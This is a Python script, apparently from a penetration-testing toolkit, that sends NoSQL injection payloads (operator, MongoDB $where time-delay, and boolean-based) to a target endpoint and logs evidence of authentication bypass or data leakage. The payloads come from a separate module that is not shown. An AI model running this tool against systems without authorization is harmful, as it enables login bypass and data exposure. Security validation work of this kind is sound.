#!/usr/bin/env python3
"""
NoSQL injection validation helper (reference only).

Implements operator injection, JavaScript injection, and boolean-based checks.
Adapt endpoints/methods/payloads to the target application before use.
"""
import argparse
import hashlib
import json
import time
from pathlib import Path
from typing import Any, Dict, List, Optional

import requests

from nosql_payloads import (
    get_boolean_payloads,
    get_js_payloads,
    get_operator_payloads,
)

MAX_RESPONSE_SIZE = 8 * 1024


def truncate_and_hash(response_text: str) -> tuple:
    full_hash = hashlib.sha256(response_text.encode()).hexdigest()
    truncated = response_text[:MAX_RESPONSE_SIZE]
    metadata = {
        "truncated": len(response_text) > MAX_RESPONSE_SIZE,
        "original_size_bytes": len(response_text),
    }
    return truncated, f"sha256:{full_hash}", metadata


def send_request(
    url: str,
    method: str,
    body: Optional[Dict],
    headers: Optional[Dict],
    timeout: int,
) -> requests.Response:
    if method.upper() == "POST":
        return requests.post(url, json=body, headers=headers, timeout=timeout)
    elif method.upper() == "GET":
        return requests.get(url, params=body, headers=headers, timeout=timeout)
    else:
        return requests.request(method, url, json=body, headers=headers, timeout=timeout)


def baseline_request(
    url: str,
    method: str,
    body: Dict,
    headers: Optional[Dict],
    timeout: int,
) -> Dict[str, Any]:
    start = time.time()
    resp = send_request(url, method, body, headers, timeout)
    duration = time.time() - start
    snippet, resp_hash, meta = truncate_and_hash(resp.text)
    return {
        "url": url,
        "method": method,
        "body": json.dumps(body),
        "status": resp.status_code,
        "response_time_seconds": round(duration, 3),
        "response_snippet": snippet[:500],
        "response_hash": resp_hash,
        "content_length": len(resp.text),
        **meta,
    }


def test_operator_injection(
    url: str,
    method: str,
    body_template: Dict,
    inject_field: str,
    headers: Optional[Dict],
    timeout: int,
    db_type: str,
) -> Dict[str, Any]:
    """Test for NoSQL operator injection (authentication bypass)."""
    # Baseline with normal value
    baseline_body = body_template.copy()
    baseline_body[inject_field] = "invalid_test_value"
    baseline = baseline_request(url, method, baseline_body, headers, timeout)

    # Test each operator payload
    for entry in get_operator_payloads(db_type):
        test_body = body_template.copy()
        test_body[inject_field] = entry["payload"]

        try:
            start = time.time()
            resp = send_request(url, method, test_body, headers, timeout)
            duration = time.time() - start
        except requests.RequestException:
            continue

        # Check for authentication bypass (200 when baseline was 401/403)
        if baseline["status"] in [401, 403] and resp.status_code == 200:
            snippet, resp_hash, meta = truncate_and_hash(resp.text)
            return {
                "status": "VALIDATED",
                "injection_type": f"nosql_operator_{entry['type']}",
                "cwe": "CWE-943",
                "baseline": baseline,
                "test": {
                    "url": url,
                    "method": method,
                    "body": json.dumps(test_body),
                    "status": resp.status_code,
                    "response_time_seconds": round(duration, 3),
                    "response_snippet": snippet[:500],
                    "response_hash": resp_hash,
                    **meta,
                },
                "evidence": f"NoSQL {entry['type']} operator bypassed authentication",
                "payload_used": json.dumps(entry["payload"]),
            }

        # Check for data leakage (significantly more content returned)
        if len(resp.text) > baseline["content_length"] * 2:
            snippet, resp_hash, meta = truncate_and_hash(resp.text)
            return {
                "status": "VALIDATED",
                "injection_type": f"nosql_operator_{entry['type']}",
                "cwe": "CWE-943",
                "baseline": baseline,
                "test": {
                    "url": url,
                    "status": resp.status_code,
                    "content_length": len(resp.text),
                    "response_hash": resp_hash,
                    **meta,
                },
                "evidence": f"NoSQL {entry['type']} operator expanded query results",
                "payload_used": json.dumps(entry["payload"]),
            }

    return {
        "status": "FALSE_POSITIVE",
        "injection_type": "nosql_operator_injection",
        "baseline": baseline,
        "evidence": "Operator payloads did not bypass authentication or expand results",
    }


def test_js_injection(
    url: str,
    method: str,
    body_template: Dict,
    inject_field: str,
    headers: Optional[Dict],
    timeout: int,
) -> Dict[str, Any]:
    """Test for MongoDB $where JavaScript injection (time-based)."""
    # Baseline
    baseline_body = body_template.copy()
    baseline_body[inject_field] = "normal_value"
    baseline = baseline_request(url, method, baseline_body, headers, timeout)

    # Test time-based JS payloads
    for entry in get_js_payloads(detection="time"):
        test_body = body_template.copy()
        test_body[inject_field] = entry["payload"]

        try:
            start = time.time()
            resp = send_request(url, method, test_body, headers, timeout + 10)
            duration = time.time() - start
        except requests.Timeout:
            duration = timeout + 10
            resp = None
        except requests.RequestException:
            continue

        delay = duration - baseline["response_time_seconds"]
        expected_delay = entry.get("delay", 5)

        if delay >= expected_delay - 0.5:
            snippet, resp_hash, meta = truncate_and_hash(resp.text if resp else "")
            return {
                "status": "VALIDATED",
                "injection_type": f"nosql_js_{entry['type']}",
                "cwe": "CWE-943",
                "baseline": baseline,
                "test": {
                    "url": url,
                    "body": json.dumps(test_body),
                    "status": resp.status_code if resp else None,
                    "response_time_seconds": round(duration, 3),
                    "response_hash": resp_hash,
                    **meta,
                },
                "evidence": f"MongoDB $where JS injection: {delay:.2f}s delay",
                "payload_used": json.dumps(entry["payload"]),
            }

    return {
        "status": "FALSE_POSITIVE",
        "injection_type": "nosql_js_injection",
        "baseline": baseline,
        "evidence": "No significant time delay from $where payloads",
    }


def test_boolean_based(
    url: str,
    method: str,
    body_template: Dict,
    inject_field: str,
    headers: Optional[Dict],
    timeout: int,
) -> Dict[str, Any]:
    """Test for boolean-based NoSQL injection."""
    baseline_body = body_template.copy()
    baseline_body[inject_field] = "normal_value"
    baseline = baseline_request(url, method, baseline_body, headers, timeout)

    for pair in get_boolean_payloads():
        try:
            # True condition
            true_body = body_template.copy()
            true_body[inject_field] = pair["true_payload"]
            true_resp = send_request(url, method, true_body, headers, timeout)
            true_len = len(true_resp.text)

            # False condition
            false_body = body_template.copy()
            false_body[inject_field] = pair["false_payload"]
            false_resp = send_request(url, method, false_body, headers, timeout)
            false_len = len(false_resp.text)
        except requests.RequestException:
            continue

        len_diff = abs(true_len - false_len)

        # Significant difference indicates boolean-based injection
        if len_diff >= 50 or true_resp.status_code != false_resp.status_code:
            return {
                "status": "VALIDATED",
                "injection_type": f"nosql_boolean_{pair['type']}",
                "cwe": "CWE-943",
                "baseline": baseline,
                "test": {
                    "true_condition": {
                        "body": json.dumps(true_body),
                        "status": true_resp.status_code,
                        "content_length": true_len,
                    },
                    "false_condition": {
                        "body": json.dumps(false_body),
                        "status": false_resp.status_code,
                        "content_length": false_len,
                    },
                },
                "evidence": f"Boolean-based NoSQLi: {len_diff} byte difference",
                "payload_used": json.dumps(pair),
            }

    return {
        "status": "FALSE_POSITIVE",
        "injection_type": "nosql_boolean",
        "baseline": baseline,
        "evidence": "No significant difference between true/false conditions",
    }


def run_tests(
    url: str,
    method: str,
    body_template: Dict,
    inject_field: str,
    injection_types: List[str],
    headers: Optional[Dict],
    timeout: int,
    db_type: str,
) -> Dict[str, Any]:
    tests = {
        "operator": lambda: test_operator_injection(
            url, method, body_template, inject_field, headers, timeout, db_type
        ),
        "js": lambda: test_js_injection(url, method, body_template, inject_field, headers, timeout),
        "boolean": lambda: test_boolean_based(
            url, method, body_template, inject_field, headers, timeout
        ),
    }
    results = {}
    for name in injection_types:
        if name in tests:
            results[name] = tests[name]()
    return results


def parse_headers(header_args: Optional[List[str]]) -> Dict[str, str]:
    headers: Dict[str, str] = {"Content-Type": "application/json"}
    if not header_args:
        return headers
    for h in header_args:
        if ":" not in h:
            continue
        key, value = h.split(":", 1)
        headers[key.strip()] = value.strip()
    return headers


def main() -> int:
    parser = argparse.ArgumentParser(description="NoSQL injection validation helper")
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument("--method", default="POST", help="HTTP method (default: POST)")
    parser.add_argument("--body", required=True, help="JSON body template with INJECT placeholder")
    parser.add_argument("--inject-field", required=True, help="Field name to inject into")
    parser.add_argument(
        "--types",
        default="operator,js,boolean",
        help="Comma-separated injection types (operator,js,boolean)",
    )
    parser.add_argument(
        "--db", default="mongodb", help="Database type (mongodb, couchdb, elasticsearch)"
    )
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout seconds")
    parser.add_argument("--output", required=True, help="Output JSON file")
    parser.add_argument("--header", action="append", help="Headers (key:value)")

    args = parser.parse_args()
    headers = parse_headers(args.header)
    types = [t.strip() for t in args.types.split(",") if t.strip()]

    try:
        body_template = json.loads(args.body)
    except json.JSONDecodeError as e:
        print(f"Error: Invalid JSON body: {e}")
        return 1

    results = run_tests(
        url=args.url,
        method=args.method,
        body_template=body_template,
        inject_field=args.inject_field,
        injection_types=types,
        headers=headers,
        timeout=args.timeout,
        db_type=args.db,
    )

    output_path = Path(args.output).resolve()
    cwd = Path.cwd().resolve()
    if not str(output_path).startswith(str(cwd)):
        print(f"Error: Output path must be within current directory: {cwd}")
        return 1

    with open(output_path, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2)

    validated = [k for k, v in results.items() if v.get("status") == "VALIDATED"]
    if validated:
        print(f"VALIDATED: {', '.join(validated)}")
    else:
        print("No NoSQL injection confirmed")

    print(f"Results saved to {output_path}")
    return 0 if not validated else 1


if __name__ == "__main__":
    raise SystemExit(main())
